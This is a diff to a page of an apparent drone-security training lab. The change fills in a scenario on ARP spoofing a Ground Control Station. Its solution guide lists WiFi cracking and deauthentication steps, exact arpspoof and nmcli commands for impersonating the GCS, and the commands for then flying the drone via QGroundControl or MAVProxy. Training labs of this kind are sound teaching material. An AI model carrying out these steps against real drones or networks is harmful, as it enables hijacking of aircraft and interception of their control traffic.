@@ -1,19 +1,109 @@
-title: Ground Control Station Takeover
-description: Scenario Under development
+title: Ground Control Station Spoofing
+order: 1
+description: ARP spoofing the Ground Control Station (GCS) to intercept and control communication between the drone and the GCS.
 breadcrumb:
   - text: Attack Scenarios
     link: /attacks
-  - text: Injection
-  - text: Ground Control Station Takeover
+  - text: Network
+  - text: Ground Control ARP Spoofing
 
 sections:
   - title: Description
     content: |
-      <span class="alert-warning">🚧 Scenario Under development</span>
+      ARP spoofing involves sending false ARP (Address Resolution Protocol) messages to a network, associating the attacker's 
+      MAC address with the IP address of the target device (the GCS in this case). This allows the attacker to intercept, modify, 
+      or block communication to the target device, effectively taking control of the drone's communication.<br><br>
+
+      The goal of this attack is to intercept and control the communication between the drone and the Ground Control 
+      Station (GCS) by performing an ARP spoofing attack. This enables the attacker to impersonate the GCS, sending 
+      and receiving commands from the drone.
 
   - title: Resources
-    content: []
+    content:
+      - text: Aircrack-ng Suite
+        link: https://www.aircrack-ng.org/
+      - text: QGroundControl
+        link: https://docs.qgroundcontrol.com/master/en/qgc-user-guide/getting_started/download_and_install.html
+      - text: MavProxy
+        link: https://ardupilot.github.io/MAVProxy/html/getting_started/download.html
 
   - title: Solution Guide
     collapsible: true
-    steps: []
+    steps:
+      - title: Step 1. Initialize the Drone
+        description: |
+          Ensure the drone is powered on and connected to the network.
+
+      - title: Step 2. Break into the Drone Network
+        description: |
+          Use WiFi packet capture and cracking techniques to gain access to the drone's network.
+          See: <a href="/attacks/recon/wifi-analysis-cracking">Wifi Cracking</a> as well as <a href="/attacks/recon/packet-sniffing">Packet Sniffing</a>
+
+      - title: Step 3. Perform WiFi Deauth Attack on GCS
+        description: |
+          Execute a deauthentication attack to disconnect the GCS from the network.
+          See: <a href="/attacks/dos/wireless-deauthentication">Wifi Deauth Attack</a>
+
+      - title: Step 4. Install QGroundControl (if on x86_64 System)
+        description: |
+          Install QGroundControl on your attacker machine (if supported) - Note: This will be different from the QGroundControl you launch from the DVD Simulator (As this has a fixed IP of 10.13.0.6 from the docker network)
+          ```wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage
+          chmod +x QGroundControl.AppImage
+          ./QGroundControl.AppImage
+          ```
+
+      - title: Step 5. Install MavProxy (if on ARM systems like Apple Silicon)
+        description: |
+          Install MavProxy on your attacker machine.
+          ```sudo pip install MAVProxy
+          mavproxy.py
+          ```
+
+      - title: Step 6. Note Kali IP Address on the Drone Network
+        description: |
+          Find and note the IP address of your attacker machine on the drone network.
+          ```ifconfig wlan0
+          ```
+
+      - title: Step 7. ARP Spoofing
+        description: |
+          Trick the router into thinking the attacker's MAC address is the GCS IP.
+          ```sudo arpspoof -i wlan0 -t 192.168.13.14 -r 192.168.13.1
+          ```
+
+      - title: Step 8. Set Static GCS IP Address
+        description: |
+          Configure your attacker machine to use the GCS IP address.
+          ```nmcli connection modify "Drone_Wifi" ipv4.method manual ipv4.addresses 192.168.13.14/24 ipv4.gateway 192.168.13.1 ipv4.dns "8.8.8.8 8.8.4.4"
+          ```
+
+      - title: Step 9. Restart Network Connection
+        description: |
+          Restart the network connection to apply changes.
+          ```nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
+          ```
+
+      - title: Step 10. Initialize Drone or Wait for Connection
+        description: |
+          Initialize the drone or wait for QGroundControl or MavProxy to connect to the drone.
+
+      - title: Step 11. Control Drone via QGroundControl (x86_64 systems)
+        description: |
+          Use QGroundControl to send commands to the drone.
+          - Right-click on the map and select "Go to"
+          - Click status and select "RTL" (Return to Launch)
+          - Click status and select "Land"
+
+      - title: Step 12. Control Drone via MavProxy (ARM systems)
+        description: |
+          Use MavProxy to send commands to the drone.
+          - Type commands such as "go to"
+          - Type "rtl" to return to launch
+          - Type "land" to land the drone
+
+      - title: Step 13. Reset Kali Network Configuration
+        description: |
+          Restore the original network settings on your attacker machine.
+          ```nmcli connection modify "Drone_Wifi" ipv4.method manual ipv4.addresses 192.168.13.10/24 ipv4.gateway 192.168.13.1 ipv4.dns "8.8.8.8 8.8.4.4"
+          nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
+          ```
